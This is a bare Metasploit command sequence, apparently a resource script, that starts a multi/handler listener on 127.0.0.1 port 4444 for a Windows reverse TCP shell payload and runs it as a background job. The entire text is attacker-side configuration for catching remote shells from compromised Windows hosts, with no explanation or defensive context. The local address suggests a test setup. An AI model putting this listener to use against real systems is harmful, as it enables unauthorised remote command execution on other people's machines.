use exploit/multi/handler 
set payload windows/shell/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444 
exploit -j
